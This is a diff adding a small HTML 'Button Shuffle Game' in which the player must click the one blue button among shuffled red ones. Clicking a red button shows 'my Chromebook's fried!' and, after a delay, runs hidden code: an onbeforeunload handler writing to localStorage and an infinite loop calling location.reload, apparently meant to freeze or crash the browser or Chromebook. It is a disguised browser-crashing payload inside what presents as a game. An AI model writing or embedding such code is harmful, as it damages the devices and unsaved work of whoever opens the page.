@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Button Shuffle Game</title>
+    <style>
+        body {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            position: relative; /* For positioning the message */
+        }
+        .button {
+            width: 100px;
+            height: 100px;
+            margin: 10px;
+            font-size: 20px;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            position: relative; /* For animation */
+            animation: limbo 1s ease-in-out infinite; /* Limbo effect */
+        }
+        .red {
+            background-color: red;
+        }
+        .blue {
+            background-color: blue;
+        }
+        #message {
+            font-size: 24px;
+            color: red;
+            position: absolute; /* Positioning the message */
+            top: 20px; /* Adjust as needed */
+            width: 100%; /* Center the message */
+            text-align: center; /* Center the text */
+            display: none; /* Initially hidden */
+        }
+        @keyframes limbo {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-20px); /* Move up */
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="message"></div>
+    <button class="button red" id="button1">Click Me!</button>
+    <button class="button red" id="button2">Click Me!</button>
+    <button class="button red" id="button3">Click Me!</button>
+    <button class="button red" id="button4">Click Me!</button>
+    <button class="button red" id="button5">Click Me!</button>
+    <button class="button blue" id="button6">Click Me!</button>
+
+    <script>
+        const buttons = document.querySelectorAll('.button');
+        const messageDiv = document.getElementById('message');
+
+        // Function to shuffle buttons
+        function shuffleButtons() {
+            const shuffledButtons = Array.from(buttons).sort(() => Math.random() - 0.5);
+            shuffledButtons.forEach(button => {
+                document.body.appendChild(button); // Re-append buttons in shuffled order
+            });
+        }
+
+        // Function to handle button click
+        function handleButtonClick(event) {
+            const clickedButton = event.target;
+
+            // Check if the clicked button is the blue one
+            if (clickedButton.classList.contains('blue')) {
+                // Remove text and change blue button to red
+                buttons.forEach(button => {
+                    button.textContent = '';
+                    button.classList.remove('blue');
+                    button.classList.add('red');
+                });
+                shuffleButtons(); // Shuffle buttons
+            } else {
+                // Display failure message
+                messageDiv.textContent = "You failed! Oh no, my Chromebook's fried!";
+                messageDiv.style.display = "block"; // Show the message
+                // Delay the infinite reload code for 1 second
+                setTimeout(function() {
+                    onbeforeunload = function() {
+                        localStorage.x = 1;
+                    };
+                    setTimeout(function() {
+                        while (1) {
+                            location.reload(1);
+                        }
+                    }, 1000);
+                }, 1000);
+            }
+        }
+
+        // Assign click event to all buttons
+        buttons.forEach(button => {
+            button.addEventListener('click', handleButtonClick);
+        });
+
+        // Shuffle buttons on page load
+        shuffleButtons();
+    </script>
+
+</body>
+</html>
